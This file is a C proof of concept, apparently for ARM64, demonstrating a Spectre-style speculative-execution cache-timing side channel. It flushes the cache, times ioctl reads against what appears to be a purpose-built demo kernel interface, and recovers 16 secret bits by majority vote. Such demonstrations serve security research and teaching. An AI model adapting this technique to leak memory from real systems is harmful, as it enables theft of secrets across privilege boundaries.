#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <err.h>

int demo_fd = 0xffffff;

unsigned long demo_timed_read(int pos) {
	unsigned long ts1, ts2;
	asm volatile (
		"isb sy\n\t"
		"dsb sy\n\t"
		"mrs %0, cntvct_el0\n\t"
	: "=&r"(ts1));
	int res = ioctl(demo_fd, 0x10000000, (pos+2)<<7);
	asm volatile (
		"mrs %0, cntvct_el0\n\t"
		"isb sy\n\t"
		"dsb sy\n\t"
	: "=&r"(ts2));
	if (res == -1)
		err(1, "demo_timed_read");
	return ts2 - ts1;
}

unsigned long demo_flush() {
	int res = ioctl(demo_fd, 0x10000001);
	if (res == -1)
		err(1, "demo_flush");
	return res;
}

void demo_slow_bounded_read(int pos) {
	ioctl(demo_fd, 0x10000002, pos);
}

int main(void) {
	// pin to core 4
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(4, &set);
	if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
		err(1, "sched_setaffinity");

	for (int i=0; i<1000000; i++) /* nothing */;

	int hot_times[10];
	int cold_times[10];
	demo_timed_read(0);
	for (int i=0; i<10; i++)
		hot_times[i] = demo_timed_read(0);
	for (int i=0; i<10; i++) {
		demo_flush();
		cold_times[i] = demo_timed_read(0);
	}
	for (int i=0; i<10; i++)
		printf("hot: %d\tcold: %d\n", hot_times[i], cold_times[i]);

	for (int i=0; i<16; i++) {
		int votes0 = 0, votes1 = 0;
		for (int j=0; j<0x802; j++) {
			int read_pos = ((j&7) == 0) ? (i+4) : 0;
			demo_flush();
			demo_slow_bounded_read(read_pos);
			if ((j&7) == 0) {
				int t0 = demo_timed_read(0);
				int t1 = demo_timed_read(1);
				if (t0 <= 14) votes0++;
				if (t1 <= 14) votes1++;
				//printf("%d vs %d\n", t0, t1);
			}
		}
		int bit = (votes0 == votes1) ? -1 : ((votes0 > votes1) ? 0 : 1);
		printf("index %d, bit %d, votes[0]=%d, votes[1]=%d\n", i, bit, votes0, votes1);
	}

	return 0;
}
